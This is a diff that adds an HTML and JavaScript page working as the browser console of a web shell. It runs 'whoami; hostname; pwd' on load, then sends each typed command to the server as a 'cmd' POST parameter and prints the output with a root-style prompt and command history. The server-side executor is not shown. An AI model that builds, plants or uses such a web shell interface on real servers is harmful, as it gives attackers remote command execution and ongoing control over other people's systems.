@@ -1,0 +1,131 @@
+
+<html>
+    <head>
+        <title></title>
+        <style></style>
+    </head>
+    <body>
+        <div class="console">
+            <div class="output" id="output"></div>
+            <div class="input">
+                <div class="username" id="username"></div>
+                <form id="form" method="GET" onSubmit="sendCommand()">
+                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
+                </form>
+            </div>
+        </div>
+        <script type="text/javascript">
+            var username = "";
+            var hostname = "";
+            var currentDir = "";
+            var commandHistory = [];
+            var currentCommand = 0;
+            var inputTextElement = document.getElementById('inputtext');
+            var outputElement = document.getElementById("output");
+            var usernameElement = document.getElementById("username");
+            getShellInfo();
+            
+            function getShellInfo() {
+                var request = new XMLHttpRequest();
+                
+                request.onreadystatechange = function() {
+                    if (request.readyState == XMLHttpRequest.DONE) {
+                        var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+                        username = parsedResponse[0];
+                        hostname = parsedResponse[1];
+                        currentDir =  parsedResponse[2];
+                        
+                        usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
+                    }
+                };
+
+                request.open("POST", "", true);
+                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                request.send("cmd=whoami; hostname; pwd");
+            }
+                        
+            function sendCommand() {
+                var request = new XMLHttpRequest();
+                var command = inputTextElement.value;
+                var originalCommand = command;
+                var originalDir = currentDir;
+                var cd = false;
+                
+                commandHistory.push(originalCommand);
+                switchCommand(commandHistory.length);
+                inputTextElement.value = "";
+
+                var parsedCommand = command.split(" ")[0];
+                if (parsedCommand == "cd") {
+                    cd = true;
+                    command = "cd "+currentDir+"; "+command+"; pwd";
+                } else if (parsedCommand == "clear") {
+                    outputElement.innerHTML = "";
+                    return false;
+                } else {
+                    command = "cd "+currentDir+"; " + command;
+                }
+                
+                request.onreadystatechange = function() {
+                    if (request.readyState == XMLHttpRequest.DONE) {
+                        if (cd) {
+                            var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+                            currentDir = parsedResponse[parsedResponse.length-2];
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
+                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
+                        } else {
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
+                            outputElement.scrollTop = outputElement.scrollHeight;
+                        } 
+                    }
+                };
+
+                request.open("POST", "", true);
+                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                request.send("cmd="+command);
+                return false;
+            }
+            
+            document.onkeydown = checkForArrowKeys;
+
+            function checkForArrowKeys(e) {
+                e = e || window.event;
+
+                if (e.keyCode == '38') {
+                    //up
+                    previousCommand();
+                } else if (e.keyCode == '40') {
+                    //down
+                    nextCommand();
+                }
+            }
+            
+            function previousCommand() {
+                if (currentCommand != 0) {
+                    switchCommand(currentCommand-1);
+                }
+            }
+            
+            function nextCommand() {
+                if (currentCommand != commandHistory.length) {
+                    switchCommand(currentCommand+1);
+                }
+            }
+            
+            function switchCommand(newCommand) {
+                currentCommand = newCommand;
+
+                if (currentCommand == commandHistory.length) {
+                    inputTextElement.value = "";
+                } else {
+                    inputTextElement.value = commandHistory[currentCommand];
+                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
+                }
+            }
+            
+            document.getElementById("form").addEventListener("submit", function(event){
+                event.preventDefault()
+            });
+        </script>
+    </body>
+</html>
